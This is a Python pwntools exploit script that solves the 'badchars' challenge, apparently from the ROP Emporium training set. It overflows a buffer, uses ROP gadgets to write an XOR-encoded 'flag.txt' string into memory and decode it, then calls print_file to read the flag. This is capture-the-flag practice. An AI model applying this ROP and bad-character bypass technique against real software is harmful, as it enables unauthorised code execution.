from pwn import *

binary = context.binary = ELF("./badchars", checksec=False)
p = process(binary.path)



def convertASCII_to_Hex(value):
      res = ""
      for i in value:
            res += hex(ord(i))[2:]
      return res

def changeEndian(value):
      length = len(value)
      res = "0x"
      for i in range(length-1, 0, -2):
            res += value[i-1]+ value[i]
      return res

def generateString(value):
      return int(changeEndian(convertASCII_to_Hex(value)), 16)

def xorByTwo(value):
    res = ""
    for i in value:
        res += chr(int(convertASCII_to_Hex(i), 16) ^ 2)
    return res

flag = p64(generateString(xorByTwo("flag.txt")))  # will convert flag.txt to a useable format to write to memory & xor the bad bytes


padding = b"\x90"*40                       # inital overwrite for RSP
pop_r12_r13_r14_r15 = p64(0x40069c)     # pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
pop_r14_r15 = p64(0x4006a0)             # pop r14 ; pop r15 ; ret
writeable = 0x601337                         # writeable segment in memory within .bss
xor_gadget = p64(0x400628)  # xor byte ptr [r15], r14b ; ret
pop_rdi = p64(0x04006a3)     # pop rdi; ret
print_file = p64(0x00400510)          # addr of print_file@plt
write_gadget = p64(0x0400634) # mov qword ptr [r13], r12 ; ret


# write flag into memory
payload = padding
payload += pop_r12_r13_r14_r15
payload += flag + p64(writeable) + p64(1337) + p64(1337) # 1337's junk for the r14 and r15 registers
payload += write_gadget

for index in range(8):
    payload += pop_r14_r15
    payload += p64(2) + p64(writeable + index) # 2 is our key for xor we also give it the writeable segment in memory and
    # add the index location or our range: [0,1,2,3,4,5,6,7], "decrypting" our flag in memory we need to do this because xor is a cheap method of encryption
    payload += xor_gadget # xor each index in r15 by the values within r14

# feed the memory location of our flag to the print_file() function
payload += pop_rdi            # pop rdi; ret
payload += p64(writeable)     # writeable segment within memory at .bss segment
payload += print_file         # print_file() location

log.info(f"flag.txt after being changed by xoring: {flag}")

p.clean()
p.sendline(payload)
print(p.recvuntil(b"ROPE{a_placeholder_32byte_flag!}"))
p.close()
